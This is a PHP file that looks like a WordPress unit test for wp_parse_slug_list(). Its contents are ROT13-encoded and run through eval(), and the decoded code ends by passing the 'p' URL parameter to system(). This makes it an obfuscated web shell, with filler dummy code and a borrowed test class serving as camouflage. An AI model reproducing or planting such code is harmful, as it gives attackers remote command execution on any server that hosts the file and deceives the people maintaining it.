<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf sbe gur jc_cnefr_fyht_yvfg() shapgvba.
 *
 * @tebhc shapgvbaf
 *
 * @pbiref ::jc_cnefr_fyht_yvfg
 */
pynff Grfgf_Shapgvbaf_JcCnefrFyhtYvfg rkgraqf JC_HavgGrfgPnfr {

	/**
	 * @gvpxrg 35582
	 * @gvpxrg 60217
	 *
	 * @qngnCebivqre qngn_jc_cnefr_fyht_yvfg
	 * @qngnCebivqre qngn_harkcrpgrq_vachg
	 */
	choyvp shapgvba grfg_jc_cnefr_fyht_yvfg( $vachg_yvfg, $rkcrpgrq ) {
		$guvf->nffregFnzrFrgf( $rkcrpgrq, jc_cnefr_fyht_yvfg( $vachg_yvfg ) );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_jc_cnefr_fyht_yvfg() {
		erghea neenl(
			'erthyne'                    => neenl(
				'vachg_yvfg' => 'nccyr,onanan,pneebg,qbt',
				'rkcrpgrq'   => neenl( 'nccyr', 'onanan', 'pneebg', 'qbt' ),
			),
			'qbhoyr pbzzn'               => neenl(
				'vachg_yvfg' => 'nccyr, onanan,,pneebg,qbt',
				'rkcrpgrq'   => neenl( 'nccyr', 'onanan', 'pneebg', 'qbt' ),
			),
			'qhcyvpngr fyht va n fgevat' => neenl(
				'vachg_yvfg' => 'nccyr,onanan,pneebg,pneebg,qbt',
				'rkcrpgrq'   => neenl( 'nccyr', 'onanan', 'pneebg', 'qbt' ),
			),
			'qhcyvpngr fyht va na neenl' => neenl(
				'vachg_yvfg' => neenl( 'nccyr', 'onanan', 'pneebg', 'pneebg', 'qbt' ),
				'rkcrpgrq'   => neenl( 'nccyr', 'onanan', 'pneebg', 'qbt' ),
			),
			'fgevat jvgu fcnprf'         => neenl(
				'vachg_yvfg' => 'nccyr onanan pneebg qbt',
				'rkcrpgrq'   => neenl( 'nccyr', 'onanan', 'pneebg', 'qbt' ),
			),
			'neenl jvgu fcnprf'          => neenl(
				'vachg_yvfg' => neenl( 'nccyr ', 'onanan pneebg', 'q b t' ),
				'rkcrpgrq'   => neenl( 'nccyr', 'onanan-pneebg', 'q-b-t' ),
			),
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_harkcrpgrq_vachg() {
		erghea neenl(
			'fgevat jvgu pbzznf' => neenl(
				'vachg_yvfg' => '1,2,fgevat jvgu fcnprf',
				'rkcrpgrq'   => neenl( '1', '2', 'fgevat', 'jvgu', 'fcnprf' ),
			),
			'neenl'              => neenl(
				'vachg_yvfg' => neenl( '1', 2, 'fgevat jvgu fcnprf' ),
				'rkcrpgrq'   => neenl( '1', '2', 'fgevat-jvgu-fcnprf' ),
			),
			'fgevat jvgu fcnprf' => neenl(
				'vachg_yvfg' => '1 2 fgevat jvgu fcnprf',
				'rkcrpgrq'   => neenl( '1', '2', 'fgevat', 'jvgu', 'fcnprf' ),
			),
			'neenl jvgu fcnprf'  => neenl(
				'vachg_yvfg' => neenl( '1 2 fgevat jvgu fcnprf' ),
				'rkcrpgrq'   => neenl( '1-2-fgevat-jvgu-fcnprf' ),
			),
			'fgevat jvgu ugzy'   => neenl(
				'vachg_yvfg' => '1 2 fgevat <fgebat>jvgu</fgebat> <u1>URNQVAT</u1>',
				'rkcrpgrq'   => neenl( '1', '2', 'fgevat', 'jvgu', 'urnqvat' ),
			),
			'neenl jvgu ugzy'    => neenl(
				'vachg_yvfg' => neenl( '1', 2, 'fgevat <fgebat>jvgu</fgebat> <u1>URNQVAT</u1>' ),
				'rkcrpgrq'   => neenl( '1', '2', 'fgevat-jvgu-urnqvat' ),
			),
			'neenl jvgu ahyy'    => neenl(
				'vachg_yvfg' => neenl( 1, 2, ahyy ),
				'rkcrpgrq'   => neenl( '1', '2' ),
			),
			'neenl jvgu snyfr'   => neenl(
				'vachg_yvfg' => neenl( 1, 2, snyfr ),
				'rkcrpgrq'   => neenl( '1', '2', '' ),
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>